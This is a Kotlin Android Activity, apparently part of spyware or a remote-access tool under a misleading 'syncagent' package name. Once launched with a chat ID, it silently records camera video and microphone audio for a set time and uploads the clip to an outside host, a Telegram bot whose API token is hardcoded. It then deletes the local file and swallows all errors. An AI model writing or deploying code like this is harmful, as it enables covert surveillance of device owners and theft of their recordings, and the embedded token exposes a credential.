package com.cognitive.ai.syncagent

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.*
import android.util.Log
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class CameraVideoRecorderActivity : Activity() {

    companion object {
        private const val TAG = "ModernVideoEngine"
    }

    private var cameraDevice: CameraDevice? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"

    private val handlerThread = HandlerThread("CameraVideoThread").apply { start() }
    private val backgroundHandler = Handler(handlerThread.looper)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val chatId = intent.getStringExtra("chat_id") ?: return finish()
        val durationSeconds = intent.getIntExtra("duration", 10)

        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
            checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            finish()
            return
        }

        val videoFile = File(cacheDir, "vid_${System.currentTimeMillis()}.mp4")
        
        try {
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoEncodingBitRate(3000000)
                setVideoFrameRate(30)
                setVideoSize(640, 480)
                setOutputFile(videoFile.absolutePath)
                prepare()
            }

            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = manager.cameraIdList[0]

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = mediaRecorder?.surface ?: return
                        val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                            addTarget(surface)
                        }

                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.setRepeatingRequest(requestBuilder.build(), null, backgroundHandler)
                                    mediaRecorder?.start()
                                    isRecording = true

                                    window.decorView.postDelayed({
                                        stopRecordingAndUpload(chatId, videoFile)
                                    }, (durationSeconds * 1000L))
                                } catch (e: Exception) {
                                    Log.e(TAG, "Start capture failed: ${e.message}")
                                    finish()
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                finish()
                            }
                        }, backgroundHandler)
                    } catch (e: Exception) {
                        finish()
                    }
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                    finish()
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    finish()
                }
            }, backgroundHandler)

        } catch (e: Exception) {
            finish()
        }
    }

    private fun stopRecordingAndUpload(chatId: String, videoFile: File) {
        try {
            if (isRecording) {
                mediaRecorder?.stop()
                isRecording = false
            }
        } catch (_: Exception) {}

        try {
            mediaRecorder?.release()
            mediaRecorder = null
        } catch (_: Exception) {}

        try {
            cameraDevice?.close()
            cameraDevice = null
        } catch (_: Exception) {}

        thread {
            if (videoFile.exists() && videoFile.length() > 0) {
                uploadVideoToTelegram(chatId, videoFile)
            }
            finish()
        }
    }

    private fun uploadVideoToTelegram(chatId: String, file: File) {
        var connection: HttpURLConnection? = null
        try {
            val boundary = "Boundary_${System.currentTimeMillis()}"
            val url = URL("https://api.telegram.org/bot$botToken/sendVideo")
            connection = url.openConnection() as HttpURLConnection
            connection.doOutput = true
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            java.io.DataOutputStream(connection.outputStream).use { out ->
                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
                out.write("$chatId\r\n".toByteArray())

                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
                out.write("🎥 تسجيل فيديو ميداني نظامي\r\n".toByteArray())

                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"video\"; filename=\"${file.name}\"\r\n".toByteArray())
                out.write("Content-Type: video/mp4\r\n\r\n".toByteArray())

                java.io.FileInputStream(file).use { it.copyTo(out) }
                out.write("\r\n--$boundary--\r\n".toByteArray())
            }
            connection.inputStream?.close()
        } catch (_: Exception) {
        } finally {
            connection?.disconnect()
            if (file.exists()) file.delete()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handlerThread.quitSafely()
    }
}
